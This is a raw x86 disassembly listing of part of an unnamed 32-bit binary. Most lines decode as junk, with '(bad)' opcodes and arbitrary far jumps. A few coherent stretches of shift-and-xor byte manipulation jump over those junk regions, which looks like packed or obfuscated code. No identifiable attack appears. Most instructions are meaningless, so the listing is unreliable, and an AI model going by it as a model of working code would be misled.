  404e4f:	sahf   
  404e50:	lods   al,BYTE PTR ds:[esi]
  404e51:	jo     0x404ecc
  404e53:	jecxz  0x404e4c
  404e55:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404e56:	and    ecx,DWORD PTR [edx-0x2]
  404e59:	adc    eax,0xaf0aece2
  404e5e:	ret    
  404e5f:	jbe    0x404e2e
  404e61:	iret   
  404e62:	adc    al,0x87
  404e64:	lods   al,BYTE PTR ds:[esi]
  404e65:	xor    al,BYTE PTR [esp]
  404e68:	(bad)  
  404e69:	mov    eax,ds:0x938fd913
  404e6e:	sub    esi,DWORD PTR [edx-0x40ac80a0]
  404e74:	retf   
  404e75:	jp     0x404e15
  404e77:	xchg   edi,eax
  404e78:	shl    DWORD PTR [edx],0x3d
  404e7b:	mov    edx,0x4abdb5e3
  404e80:	and    bl,BYTE PTR [ebx-0x38]
  404e83:	jmp    0xa373:0xe933a810
  404e8a:	cmp    DWORD PTR [ebp-0x3a],eax
  404e8d:	lock add dh,al
  404e90:	imul   esi,eax,0x36
  404e93:	mov    ds:0x4415bcbc,al
  404e98:	rol    BYTE PTR [ebx+0x3f],1
  404e9b:	sti    
  404e9c:	push   ds
  404e9d:	xchg   edx,eax
  404e9e:	sbb    eax,0xd36dcc4d
  404ea3:	ja     0x404eb5
  404ea5:	jg     0x404f25
  404ea7:	pop    eax
  404ea8:	mov    eax,0x25df7e6b
  404ead:	in     al,dx
  404eae:	pop    edx
  404eaf:	dec    ebx
  404eb0:	add    esi,DWORD PTR [edi+ebx*8]
  404eb3:	mov    dl,0x29
  404eb5:	xor    edi,DWORD PTR [ecx-0x259a7334]
  404ebb:	pushf  
  404ebc:	jne    0x404ecb
  404ebe:	dec    esp
  404ebf:	mov    ds:0xded49982,eax
  404ec4:	mov    al,ds:0x33eb0da6
  404ec9:	(bad)  
  404eca:	xor    edx,edx
  404ecc:	or     eax,edx
  404ece:	mov    cl,BYTE PTR [eax+ecx*1]
  404ed1:	mov    eax,DWORD PTR [ebp-0x34]
  404ed4:	or     BYTE PTR [eax],cl
  404ed6:	mov    eax,DWORD PTR [ebp-0x10]
  404ed9:	mov    ecx,DWORD PTR [ebp-0xc]
  404edc:	shrd   eax,ecx,0x2
  404ee0:	shr    ecx,0x2
  404ee3:	mov    ecx,DWORD PTR [ebp-0x10]
  404ee6:	mov    edx,DWORD PTR [ebp-0xc]
  404ee9:	xor    eax,edi
  404eeb:	shl    ecx,0x1e
  404eee:	xor    edx,edx
  404ef0:	or     eax,edx
  404ef2:	lea    eax,[ebp+eax*1-0x4]
  404ef6:	mov    DWORD PTR [ebp-0x34],eax
  404ef9:	mov    eax,DWORD PTR [ebp-0x10]
  404efc:	mov    ecx,DWORD PTR [ebp-0xc]
  404eff:	shrd   eax,ecx,0x2
  404f03:	shr    ecx,0x2
  404f06:	mov    ecx,DWORD PTR [ebp-0x10]
  404f09:	mov    edx,DWORD PTR [ebp-0xc]
  404f0c:	xor    eax,edi
  404f0e:	shl    ecx,0x1e
  404f11:	mov    ecx,DWORD PTR [ebp-0x14]
  404f14:	xor    edx,edx
  404f16:	or     eax,edx
  404f18:	mov    cl,BYTE PTR [eax+ecx*1]
  404f1b:	mov    eax,DWORD PTR [ebp-0x34]
  404f1e:	add    BYTE PTR [eax],cl
  404f20:	mov    eax,DWORD PTR [ebp-0x60]
  404f23:	mov    ecx,DWORD PTR [ebp-0x5c]
  404f26:	shrd   eax,ecx,0x2
  404f2a:	shr    ecx,0x2
  404f2d:	mov    ecx,DWORD PTR [ebp-0x60]
  404f30:	mov    edx,DWORD PTR [ebp-0x5c]
  404f33:	xor    eax,edi
  404f35:	xor    edx,edx
  404f37:	or     eax,edx
  404f39:	lea    eax,[ebp+eax*1-0x4]
  404f3d:	mov    DWORD PTR [ebp-0x34],eax
  404f40:	mov    eax,DWORD PTR [ebp-0x60]
  404f43:	shl    ecx,0x1e
  404f46:	mov    ecx,DWORD PTR [ebp-0x5c]
  404f49:	shrd   eax,ecx,0x2
  404f4d:	shr    ecx,0x2
  404f50:	mov    ecx,DWORD PTR [ebp-0x60]
  404f53:	mov    edx,DWORD PTR [ebp-0x5c]
  404f56:	xor    eax,edi
  404f58:	xor    edx,edx
  404f5a:	or     eax,edx
  404f5c:	mov    edx,DWORD PTR [ebp+0x14]
  404f5f:	shl    ecx,0x1e
  404f62:	mov    ecx,DWORD PTR [ebp-0x14]
  404f65:	mov    cl,BYTE PTR [eax+ecx*1]
  404f68:	mov    eax,DWORD PTR [ebp-0x34]
  404f6b:	or     BYTE PTR [eax],cl
  404f6d:	jmp    0x40530e
  404f72:	mov    DWORD PTR [edx],ecx
  404f74:	push   0xabac68c5
  404f79:	mov    al,BYTE PTR [edi+0x65920a40]
  404f7f:	and    ebx,ecx
  404f81:	jecxz  0x404f41
  404f83:	adc    DWORD PTR [esi-0x413b4242],edi
  404f89:	mov    esi,0x943961b6
  404f8e:	ja     0x404fde
  404f90:	retf   0x8ff5
  404f93:	fwait
  404f94:	hlt    
  404f95:	lahf   
  404f96:	xor    eax,0x54140b3d
  404f9b:	and    edi,ecx
  404f9d:	stos   DWORD PTR es:[edi],eax
  404f9e:	xchg   esi,eax
  404f9f:	call   0x81df6032
  404fa4:	nop
  404fa5:	stos   DWORD PTR es:[edi],eax
  404fa6:	inc    ecx
  404fa7:	rol    DWORD PTR [esi+eax*8-0x6e],cl
  404fab:	push   esp
  404fac:	fimul  DWORD PTR [ecx-0x73a7c6a4]
  404fb2:	jg     0x404fc9
  404fb4:	scas   eax,DWORD PTR es:[edi]
  404fb5:	mov    DWORD PTR [eax-0x224f1abc],esi
  404fbb:	loope  0x404fb8
  404fbd:	mov    bh,0x88
  404fbf:	bound  edx,QWORD PTR [ebx+0x6ae1659f]
  404fc5:	jne    0x404f6c
  404fc7:	(bad)  
  404fc8:	pop    ss
  404fc9:	xchg   edi,eax
  404fca:	cmp    al,BYTE PTR [esi]
  404fcc:	mov    ah,0xdb
  404fce:	pop    es
  404fcf:	cdq    
  404fd0:	dec    BYTE PTR [ecx+0x3]
  404fd3:	clc    
  404fd4:	fcmove st,st(4)
  404fd6:	stos   BYTE PTR es:[edi],al
  404fd7:	jns    0x405033
  404fd9:	mov    al,ds:0x695cdab9
  404fde:	jge    0x405009
  404fe0:	fld    QWORD PTR [eax]
  404fe2:	fnstsw WORD PTR [ecx-0x42963c9d]
  404fe8:	imul   ecx,DWORD PTR [edx-0xed6cb6a],0xe040d63c
  404ff2:	push   ss
  404ff3:	scas   eax,DWORD PTR es:[edi]
  404ff4:	ds mov ebp,0x2634cde7
  404ffa:	call   0xd5d06dc2
  404fff:	arpl   WORD PTR [edi+0x2e1c322c],ax
  405005:	sbb    al,0xf4
  405007:	shl    BYTE PTR [esi+edi*1],cl
  40500a:	stc    
  40500b:	add    esi,DWORD PTR [ecx]
  40500d:	addr16 dec esp
  40500f:	aaa    
  405010:	push   ds
  405011:	push   esi
  405012:	clc    
  405013:	shr    DWORD PTR [edx-0x3c4361ed],1
  405019:	cmp    edx,0xffffff8e
  40501c:	out    0x95,al
  40501e:	jle    0x404fd1
  405020:	and    DWORD PTR ds:[eax],esp
  405023:	pushf  
  405024:	sti    
  405025:	pop    esp
  405026:	xchg   esi,eax
  405027:	and    al,0xb5
  405029:	dec    esp
  40502a:	in     eax,dx
  40502b:	out    0x4f,al
  40502d:	inc    ebp
  40502e:	sub    DWORD PTR [ecx+0x4f],esi
  405031:	xchg   edi,eax
  405032:	mov    ah,BYTE PTR [ecx-0x22]
  405035:	int    0x11
  405037:	cmp    DWORD PTR [edx],esi
  405039:	xchg   ebx,eax
  40503a:	cmp    bl,BYTE PTR [edi]
  40503c:	cmovs  ebp,DWORD PTR [esi+0xf2d74e3]
  405043:	xlat   BYTE PTR ds:[ebx]
  405044:	mov    esp,0xfe198a8a
  405049:	jge    0x404ff5
  40504b:	out    dx,eax
  40504c:	sub    BYTE PTR [ebx+0x6a6b2ab2],dl
  405052:	sbb    BYTE PTR [eax-0x60ad4a9c],al
  405058:	stc    
  405059:	pop    ebp
  40505a:	xchg   BYTE PTR [ebp+0x11915232],ch
  405060:	sub    DWORD PTR [ebx-0x3234559c],edx
  405066:	lea    ebx,[eax]
  405068:	mov    bl,0x77
  40506a:	rcl    DWORD PTR [eax-0x35],1
  40506d:	sti    
  40506e:	sbb    DWORD PTR [edi-0x37a651fb],edx
  405074:	inc    ecx
  405075:	push   edx
  405076:	inc    edx
  405077:	fistp  QWORD PTR [edx+0x5e094abd]
  40507d:	push   ecx
  40507e:	je     0x40509b
  405080:	xor    bh,bl
  405082:	jge    0x405017
  405084:	jbe    0x4050ea
  405086:	pop    edx
  405087:	sub    eax,0x3efd9ebb
  40508c:	mov    cl,dl
  40508e:	outs   dx,BYTE PTR ds:[esi]
  40508f:	and    eax,0x22553231
  405094:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405095:	int3   
  405096:	jb     0x4050d4
  405098:	ss mov ebx,0x45557740
  40509e:	mov    ebp,0x16507090
  4050a3:	mov    ch,0x3a
  4050a5:	cmc    
  4050a6:	inc    ah
  4050a8:	mov    bh,0x87
  4050aa:	mov    edi,cs
  4050ac:	push   0x49d829c1
  4050b1:	ret    0x1eb0
  4050b4:	jo     0x4050b4
  4050b6:	and    al,0xa1
  4050b8:	cwde   
  4050b9:	mov    bh,BYTE PTR [edx+0x31dc9411]
  4050bf:	in     eax,dx
  4050c0:	imul   ebx,DWORD PTR [eax-0x6ca906b],0xceed317d
  4050ca:	(bad)  
  4050cc:	(bad)  
  4050cd:	out    dx,al
  4050ce:	int    0x41
  4050d0:	sti    
  4050d1:	sub    esp,DWORD PTR [ecx]
  4050d3:	ins    DWORD PTR es:[edi],dx
  4050d4:	ud2    
  4050d6:	js     0x405113
  4050d8:	in     al,dx
  4050d9:	not    DWORD PTR [edx]
  4050db:	xchg   esi,eax
  4050dc:	xchg   ebx,eax
  4050dd:	dec    esi
  4050de:	pop    ecx
  4050df:	les    eax,FWORD PTR [eax]
  4050e1:	aaa    
  4050e2:	mov    dl,bh
  4050e4:	jl     0x4050ee
  4050e6:	and    BYTE PTR [ebx+ebp*1-0x9],bh
  4050ea:	push   eax
  4050eb:	add    eax,0x3e1ca10a
  4050f0:	(bad)  
  4050f1:	jbe    0x405106
  4050f3:	icebp  
  4050f4:	xchg   ecx,eax
  4050f5:	dec    ebp
  4050f6:	xor    eax,0x4d530c56
  4050fb:	mov    dl,0x66
  4050fd:	shl    DWORD PTR [ecx-0x7e],cl
  405100:	iret   
  405101:	jge    0x40508a
  405103:	sbb    DWORD PTR [edx+0x53b91862],0xffffffcd
  40510a:	push   edx
  40510b:	repz pop eax
  40510d:	dec    edx
  40510e:	mov    cl,0xff
  405110:	into   
  405111:	aam    0x79
  405113:	mov    edi,0x3087a4cf
  405118:	mov    BYTE PTR [edx+0x217a3059],bh
  40511e:	add    dh,BYTE PTR [edx+0x29c085d1]
  405124:	adc    bl,ch
  405126:	nop
  405127:	imul   DWORD PTR [edx]
  405129:	or     al,0x20
  40512b:	mov    bl,BYTE PTR [eax+0x57]
  40512e:	pop    edx
  40512f:	(bad)  
  405130:	hlt    
  405131:	xchg   DWORD PTR [ebx],esp
  405133:	xchg   DWORD PTR [edx+0x27c742a4],ebp
  405139:	psubsw mm3,mm2
  40513c:	mov    edx,DWORD PTR [esi+ebp*4]
  40513f:	fisubr DWORD PTR [ecx]
  405141:	bound  ebp,QWORD PTR [ebp-0x3e]
  405144:	adc    al,0x0
  405146:	xchg   ebp,eax
  405147:	xor    ebp,DWORD PTR [eax+eiz*2+0x1732144d]
  40514e:	mov    ebx,DWORD PTR [edx]
  405150:	(bad)  
  405151:	imul   ebx,DWORD PTR [eax],0x58
  405154:	jle    0x40515a
  405156:	cmc    
  405157:	xor    al,0xbf
  405159:	sub    al,0xcf
  40515b:	cmp    al,0xa
  40515d:	xor    al,0x4c
  40515f:	fnstcw WORD PTR [edi]
  405161:	(bad)  
  405162:	push   eax
  405163:	jecxz  0x405164
  405165:	xor    BYTE PTR [ecx],0x27
  405168:	and    al,0x6e
  40516a:	jl     0x4051af
  40516c:	pop    ss
  40516d:	nop
  40516e:	mov    bl,0x58
  405170:	and    bl,BYTE PTR [esi+eax*2+0x3f]
  405174:	repnz adc edx,edx
  405177:	(bad)  
  405178:	cld    
  405179:	xor    bl,dl
  40517b:	fld    DWORD PTR [edx-0x773d5d9f]
  405181:	(bad)  
  405182:	loopne 0x405195
  405184:	adc    eax,0xf9c55d65
  405189:	xor    cl,BYTE PTR [edi+eax*2+0x6]
  40518d:	or     eax,0xc8e48dad
  405192:	mov    eax,gs
  405194:	inc    ecx
  405195:	mov    ds:0xc5e5d3c3,al
  40519a:	imul   edx,ebp,0xe31e22f4
  4051a0:	pusha  
  4051a1:	xchg   edx,eax
  4051a2:	fisub  WORD PTR [ebx+0x4]
  4051a5:	jmp    0x390d1672
  4051aa:	mov    cl,0x8
  4051ac:	pop    edi
  4051ad:	xchg   ebx,eax
  4051ae:	jnp    0x405205
  4051b0:	jg     0x4051cb
  4051b2:	adc    ecx,esp
  4051b4:	fistp  QWORD PTR [edx]
  4051b6:	ret    
  4051b7:	shl    DWORD PTR [eax],cl
  4051b9:	xchg   esp,eax
  4051ba:	dec    eax
  4051bb:	mov    edx,DWORD PTR [edx]
  4051bd:	push   0x1ce331b3
  4051c2:	cmp    esi,edi
  4051c4:	sbb    edx,edx
  4051c6:	pushf  
  4051c7:	jne    0x405243
  4051c9:	nop
  4051ca:	mov    al,0xfb
  4051cc:	lods   eax,DWORD PTR ds:[esi]
  4051cd:	dec    edx
  4051ce:	inc    esi
  4051cf:	(bad)  
  4051d0:	in     eax,0x95
  4051d2:	(bad)  
  4051d3:	dec    ebp
  4051d4:	inc    esi
  4051d5:	ror    BYTE PTR [edx],cl
  4051d7:	mov    al,0x63
  4051d9:	in     al,0x8a
  4051db:	fidiv  DWORD PTR [ebp+0x691ba578]
  4051e1:	cmc    
  4051e2:	fdiv   QWORD PTR [edx+eiz*2]
  4051e5:	pusha  
  4051e6:	aad    0x9c
  4051e8:	jmp    0x3ac0:0x1a3743c6
  4051ef:	scas   al,BYTE PTR es:[edi]
  4051f0:	inc    DWORD PTR [ebx]
  4051f2:	mov    esi,0xbd27f402
  4051f7:	lahf   
  4051f8:	cmc    
  4051f9:	mov    al,0x12
  4051fb:	jle    0x40527a
  4051fd:	ja     0x405180
  4051ff:	les    edi,FWORD PTR [ebx+0x12d55250]
  405205:	lods   al,BYTE PTR ds:[esi]
  405206:	push   esp
  405207:	sbb    eax,0x47f19682
  40520c:	cdq    
  40520d:	xchg   esp,eax
  40520e:	cvtpi2ps xmm1,QWORD PTR [edi]
  405211:	rol    DWORD PTR [eax-0x5e],cl
  405214:	dec    esi
  405215:	jbe    0x4051b8
  405217:	add    al,0x60
  405219:	inc    ecx
  40521a:	pop    esp
  40521b:	pop    eax
  40521c:	ins    BYTE PTR es:[edi],dx
  40521d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40521e:	adc    BYTE PTR [edi-0x5e],al
  405221:	int    0xcb
  405223:	mov    ebp,0x992aeadf
  405228:	neg    BYTE PTR [ecx]
  40522a:	jae    0x405254
  40522c:	hlt    
  40522d:	call   0x4388:0x976874da
  405234:	jb     0x4051fc
  405236:	sar    DWORD PTR fs:[ecx-0x4d],cl
  40523a:	and    eax,0x7072a9a
  40523f:	call   0xee771379
  405244:	sar    edi,1
  405246:	outs   dx,DWORD PTR ds:[esi]
  405247:	or     al,0x67
  405249:	ror    DWORD PTR [edx-0x68],cl
  40524c:	(bad)  
  40524d:	sub    esi,DWORD PTR [edi]
  40524f:	jb     0x4052a8
  405251:	enter  0x3d2b,0x8d
  405255:	sbb    al,0x94
  405257:	inc    esi
  405258:	xor    DWORD PTR [ecx+0x4b4b47bf],0xffffffa2
  40525f:	inc    ebx
  405260:	mov    bh,0xdd
  405262:	mov    ecx,DWORD PTR [ecx-0x8d05fce]
  405268:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405269:	push   ss
  40526a:	scas   eax,DWORD PTR es:[edi]
  40526b:	call   0x2fcd:0x4fe32515
  405272:	push   ecx
  405273:	adc    al,0xf4
  405275:	repz out 0x24,al
  405278:	rol    BYTE PTR [ecx],cl
  40527a:	jp     0x4052f2
  40527c:	mov    edi,0xb756561d
  405281:	add    eax,0x9771680b
  405286:	repnz cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405288:	fndisi(8087 only) 
  40528a:	sub    BYTE PTR [edx-0x8308c96],0xa5
  405291:	inc    esp
  405292:	xor    bh,dh
  405294:	retf   0xd869
  405297:	loop   0x405284
  405299:	(bad)  
  40529a:	mov    ds:0x49998823,eax
  40529f:	inc    ebp
  4052a0:	mov    al,0xb6
  4052a2:	cmp    BYTE PTR [ebp+ebp*2-0x3e],al
  4052a6:	dec    edx
  4052a7:	sub    BYTE PTR [eax-0x62],dl
  4052aa:	xor    esp,DWORD PTR [edi]
  4052ac:	fnstenv [ebx+ebx*4-0x3]
  4052b0:	(bad)  
  4052b1:	shl    BYTE PTR [esi+0x5d51e3ad],1
  4052b7:	sub    DWORD PTR [ecx+0x21233c75],esi
  4052bd:	jnp    0x405327
  4052bf:	sar    BYTE PTR [esi+0x51],1
  4052c2:	sub    eax,0x9199defd
  4052c7:	dec    ecx
  4052c8:	pop    esi
  4052c9:	add    esp,DWORD PTR [esp+eax*1]
  4052cc:	test   eax,0x74a308e7
  4052d1:	cli    
  4052d2:	les    ebp,FWORD PTR [ebx]
  4052d4:	xor    ecx,ecx
  4052d6:	fwait
  4052d7:	clc    
  4052d8:	jbe    0x405278
  4052da:	mov    dl,0x5d
  4052dc:	stos   BYTE PTR es:[edi],al
  4052dd:	and    eax,0xe06cec6f
  4052e2:	xor    ch,BYTE PTR [esi]
  4052e4:	xor    DWORD PTR cs:[esi+0x769a81b5],edi
  4052eb:	int3   
  4052ec:	lahf   
  4052ed:	pop    edi
  4052ee:	xchg   ebx,eax
  4052ef:	mov    cl,0x27
  4052f1:	js     0x4052f9
  4052f3:	push   ebp
  4052f4:	mov    eax,0x51e38498
  4052f9:	fiadd  WORD PTR [edi]
  4052fb:	push   esi
  4052fc:	mov    eax,ds:0x648c6663
  405301:	std    
  405302:	jno    0x40529f
  405304:	dec    DWORD PTR [ebx+0x2f]
  405307:	loope  0x4052a0
  405309:	les    ecx,FWORD PTR [edi+0x11]
  40530c:	sahf   
  40530d:	mov    ecx,DWORD PTR [ebx-0x3774efbb]
  405313:	shrd   ecx,edx,0x2
  405317:	shl    eax,0x1e
  40531a:	shr    edx,0x2
  40531d:	mov    DWORD PTR [ebp+0x14],edx
  405320:	mov    DWORD PTR [ebp+0x14],eax
  405323:	xor    edx,edx
  405325:	mov    eax,ecx
  405327:	jmp    0x4056c8
  40532c:	sub    eax,0x846700b2
  405331:	jnp    0x4052e9
  405333:	mov    esp,0xe3d964fe
  405338:	lds    ecx,FWORD PTR [esi]
  40533a:	call   0xbdbe:0xbe17bde3
  405341:	les    edi,FWORD PTR [esi+0x363736be]
  405347:	xchg   edx,eax
  405348:	add    DWORD PTR [ecx],ebp
  40534a:	(bad)  
  40534b:	enter  0xe708,0xb0
  40534f:	in     al,dx
  405350:	xlat   BYTE PTR ds:[ebx]
  405351:	scas   eax,DWORD PTR es:[edi]
  405352:	enter  0x9c19,0x43
  405356:	cmp    BYTE PTR [eax],bl
  405358:	popa   
  405359:	jns    0x40537e
  40535b:	jle    0x4053a6
  40535d:	sub    dh,bl
  40535f:	(bad)
  405363:	mov    dl,0x62
  405365:	cmp    dh,BYTE PTR [ecx+0x62]
  405368:	mov    ss,ebp
  40536a:	ret    
  40536b:	or     eax,0xa6c3e4ea
  405370:	mov    bh,0xe7
  405372:	xchg   esp,eax
  405373:	or     dl,BYTE PTR [edi-0x2a]
  405376:	cwde   
  405377:	rcr    BYTE PTR ds:[esi+0x31e3e6f5],0x6e
  40537f:	jns    0x4053f7
  405381:	xlat   BYTE PTR ds:[ebx]
  405382:	sub    ch,bh
  405384:	mov    eax,ds:0x1de9939e
  405389:	mov    eax,0x76f76a3f
  40538e:	xchg   edx,eax
  40538f:	mov    dl,0x71
  405391:	mov    esi,0x2cccdf60
  405396:	outs   dx,BYTE PTR ds:[esi]
  405397:	mov    eax,0xb18d1a5
  40539c:	je     0x4053a4
  40539e:	std    
  40539f:	hlt    
  4053a0:	les    ebp,FWORD PTR [esp+edi*4]
  4053a3:	std    
  4053a4:	or     bh,0x30
  4053a7:	inc    esi
  4053a8:	jo     0x40536a
  4053aa:	sub    esp,DWORD PTR [ebx]
  4053ac:	sbb    edx,ebp
  4053ae:	rol    BYTE PTR [ebx],1
  4053b0:	sub    BYTE PTR [eax+0x3],0x41
  4053b4:	mov    ah,0x18
  4053b6:	mov    esi,0x9f234917
  4053bb:	mov    bl,0x3d
  4053bd:	or     ebp,DWORD PTR [ebx-0x80]
  4053c0:	dec    ecx
  4053c1:	add    eax,0xeec4f577
  4053c6:	jb     0x40536a
  4053c8:	in     al,dx
  4053c9:	mov    eax,DWORD PTR [ebx]
  4053cb:	jne    0x405390
  4053cd:	dec    ecx
  4053ce:	rcl    BYTE PTR [ebx],cl
  4053d0:	adc    bl,BYTE PTR [edx+0x30eedea4]
  4053d6:	ficom  WORD PTR [ebp-0x33c457f1]
  4053dc:	xlat   BYTE PTR ds:[ebx]
  4053dd:	jle    0x4053e4
  4053df:	rcl    BYTE PTR [ebp+0x24],cl
  4053e2:	pusha  
  4053e3:	push   cs
  4053e4:	mov    al,0xd3
  4053e6:	or     BYTE PTR [esi+ebx*8-0x70],dh
  4053ea:	inc    edi
  4053eb:	int    0xba
  4053ed:	sti    
  4053ee:	mov    dl,0x74
  4053f0:	arpl   bp,sp
  4053f2:	mov    eax,0xb5c7868
  4053f7:	cdq    
  4053f8:	loopne 0x40544a
  4053fa:	push   0xffffffaa
  4053fc:	icebp  
  4053fd:	adc    al,0x35
  4053ff:	lahf   
  405400:	mov    ds:0xeab4f20d,al
  405405:	sbb    DWORD PTR [edx-0x7b],ecx
  405408:	cmc    
  405409:	cmc    
  40540a:	dec    edx
  40540b:	pushf  
  40540c:	mov    bh,0x36
  40540e:	push   eax
  40540f:	cdq    
  405410:	adc    al,0x3f
  405412:	fwait
  405413:	fwait
  405414:	add    BYTE PTR [esi],cl
  405416:	not    DWORD PTR [eax+0x511d9c24]
  40541c:	mov    ebp,0xef71f4fb
  405421:	sbb    edi,DWORD PTR [ecx]
  405423:	loop   0x4053d8
  405425:	push   ecx
  405426:	mov    al,0xa
  405428:	inc    esi
  405429:	cmp    ecx,edx
  40542b:	and    BYTE PTR [edx+0x31ca3370],0x6b
  405432:	lock xor esp,eax
  405435:	lds    ebx,FWORD PTR [ebp+0x20ae3b87]
  40543b:	shr    edi,cl
  40543d:	cmc    
  40543e:	shl    bh,cl
  405440:	pop    eax
  405441:	and    eax,0x831e5ede
  405446:	mov    cl,0x5b
  405448:	push   edx
  405449:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40544a:	int3   
  40544b:	imul   ebp,DWORD PTR ds:0xbdfbc073,0xffffff86
  405452:	pop    ss
  405453:	pop    eax
  405454:	add    eax,DWORD PTR [edx-0x37]
  405457:	jno    0x40547c
  405459:	push   ebx
  40545a:	out    dx,eax
  40545b:	retf   
  40545c:	out    0x7a,al
  40545e:	sub    ch,al
  405460:	rcl    cl,1
  405462:	pop    ds
  405463:	pop    edi
  405464:	loopne 0x40546e
  405466:	mov    esi,0xed63ef9
  40546b:	cli    
  40546c:	in     al,dx
  40546d:	cs xchg ecx,eax
  40546f:	inc    eax
  405470:	xor    BYTE PTR [edi+eax*4+0x2bbc275c],ah
  405477:	lods   al,BYTE PTR ds:[esi]
  405478:	xor    DWORD PTR [eax],edi
  40547a:	stos   BYTE PTR es:[edi],al
  40547b:	int3   
  40547c:	xchg   esi,eax
  40547d:	dec    edi
  40547e:	mov    bl,0x70
  405480:	push   cs
  405481:	pushf  
  405482:	lods   al,BYTE PTR ds:[esi]
  405483:	rol    ah,cl
  405485:	cmp    BYTE PTR [ebx-0x587e6399],al
  40548b:	xchg   ebp,eax
  40548c:	sub    edx,DWORD PTR [ebx]
  40548e:	adc    al,BYTE PTR [edi-0x6f]
  405491:	push   ss
  405492:	outs   dx,BYTE PTR ds:[esi]
  405493:	mov    ch,0xa2
  405495:	addr16 nop
  405497:	sub    dl,BYTE PTR [ecx+0x56684049]
  40549d:	adc    ebp,DWORD PTR [ecx]
  40549f:	retf   0x3e45
  4054a2:	lock mov WORD PTR [eax-0x1f],es
  4054a6:	xor    eax,DWORD PTR [edi]
  4054a8:	mov    al,0xb0
  4054aa:	sub    BYTE PTR [esp+edx*4-0x76],dh
  4054ae:	out    dx,eax
  4054af:	mov    ah,0xc0
  4054b1:	dec    esi
  4054b2:	in     eax,dx
  4054b3:	mov    ebp,DWORD PTR [ebx+0x30a15db4]
  4054b9:	in     eax,dx
  4054ba:	idiv   BYTE PTR [ecx-0x58c5a119]
  4054c0:	sahf   
  4054c1:	lds    edi,FWORD PTR [edi+0x36]
  4054c4:	sub    edx,DWORD PTR [edx+ecx*8-0x1918c8f]
  4054cb:	loop   0x40549e
  4054cd:	cmp    BYTE PTR [esi-0x22],ch
  4054d0:	mov    edi,DWORD PTR [edx]
  4054d2:	jecxz  0x405472
  4054d4:	inc    edx
  4054d5:	mul    DWORD PTR [ebx-0x68]
  4054d8:	icebp  
  4054d9:	push   edi
  4054da:	or     eax,0x5a06975
  4054df:	ins    DWORD PTR es:[edi],dx
  4054e0:	aam    0x63
  4054e2:	jg     0x405502
  4054e4:	shr    BYTE PTR [eax],1
  4054e6:	ror    bh,cl
  4054e8:	icebp  
  4054e9:	push   cs
  4054ea:	dec    edi
  4054eb:	aad    0xae
  4054ed:	lods   eax,DWORD PTR ds:[esi]
  4054ee:	shl    BYTE PTR [ebp-0xa],1
  4054f1:	xchg   ebx,eax
  4054f2:	mov    WORD PTR [ecx+0x4278b399],?
  4054f8:	add    al,ah
  4054fa:	adc    al,0x74
  4054fc:	push   cs
  4054fd:	sahf   
  4054fe:	pop    ebp
  4054ff:	xor    DWORD PTR [edi-0x17d21b58],ebp
  405505:	int3   
  405506:	ficomp WORD PTR [ebx-0x1308a2a0]
  40550c:	dec    BYTE PTR [edx]
  40550e:	and    al,0xee
  405510:	xor    eax,0x25d98418
  405515:	in     eax,dx
  405516:	stc    
  405517:	ss jmp 0x405594
  40551a:	jnp    0x4054d1
  40551c:	xchg   edx,eax
  40551d:	jp     0x405540
  40551f:	int3   
  405520:	pop    edi
  405521:	loope  0x405572
  405523:	sub    eax,0xac9a142b
  405528:	pusha  
  405529:	push   ss
  40552a:	jmp    FWORD PTR [eax-0x2a]
  40552d:	sbb    ah,BYTE PTR [esi-0x20]
  405530:	jmp    0xb328:0xfe367223
  405537:	retf   
  405538:	fld    DWORD PTR [eax]
  40553a:	xor    al,0x99
  40553c:	inc    esp
  40553d:	add    bl,al
  40553f:	pop    ss
  405540:	stos   BYTE PTR es:[edi],al
  405541:	ret    0x0
  405544:	mov    ah,0x45
  405546:	pop    edi
  405547:	aad    0xf1
  405549:	lea    esp,[ebx+ecx*1]
  40554c:	mov    bl,0xe2
  40554e:	jmp    0xc36b6e4a
  405553:	bound  esp,QWORD PTR [edx-0x46]
  405556:	mov    ebp,0x8eb59896
  40555b:	jle    0x40558e
  40555d:	int    0xa2
  40555f:	int    0xcc
  405561:	add    ecx,DWORD PTR [ebp+0x42]
  405564:	push   ss
  405565:	sub    DWORD PTR [ecx],esi
  405567:	push   ecx
  405568:	push   0x506a8889
  40556d:	pop    esp
  40556e:	xor    ebx,edx
  405570:	test   al,0x73
  405572:	int3   
  405573:	test   BYTE PTR [eax+0x2cd86af5],ch
  405579:	(bad)  
  40557a:	cs jae 0x40555c
  40557d:	pushf  
  40557e:	add    ah,BYTE PTR [ebx+0x77]
  405581:	lds    edi,FWORD PTR [ebx]
  405583:	add    ecx,0xd47e340
  405589:	mov    ds:0x7b90e9c9,al
  40558e:	push   esi
  40558f:	(bad)  
  405590:	mul    DWORD PTR ds:0xb991bf39
  405596:	outs   dx,DWORD PTR ds:[esi]
  405597:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405598:	dec    ebx
  405599:	stos   DWORD PTR es:[edi],eax
  40559a:	in     eax,dx
  40559b:	sub    ch,BYTE PTR [ecx]
  40559d:	pop    ds
  40559e:	inc    edx
  40559f:	aad    0x23
  4055a1:	mov    cl,0x46
  4055a3:	cmc    
  4055a4:	cmc    
  4055a5:	cmp    cl,BYTE PTR [edx-0x51a2bb3c]
  4055ab:	mov    edx,DWORD PTR [eax-0x29681847]
  4055b1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4055b2:	mov    eax,ds:0x7f16ff79
  4055b7:	js     0x405544
  4055b9:	xchg   edx,eax
  4055ba:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4055bb:	loope  0x4055ae
  4055bd:	jne    0x405595
  4055bf:	aas    
  4055c0:	and    esi,0x4c9628b6
  4055c6:	retf   0x9c9d
  4055c9:	pop    eax
  4055ca:	fimul  DWORD PTR [eax]
  4055cc:	mov    BYTE PTR [esi+0x50],bl
  4055cf:	in     eax,0x0
  4055d1:	lods   al,BYTE PTR ds:[esi]
  4055d2:	aaa    
  4055d3:	call   0x99f12f59
  4055d8:	gs sbb eax,0x6a15b8e7
  4055de:	inc    ecx
  4055df:	in     eax,dx
  4055e0:	out    0x8f,al
  4055e2:	jo     0x40558a
  4055e4:	xchg   esp,eax
  4055e5:	push   ecx
  4055e6:	xchg   ecx,eax
  4055e7:	inc    edi
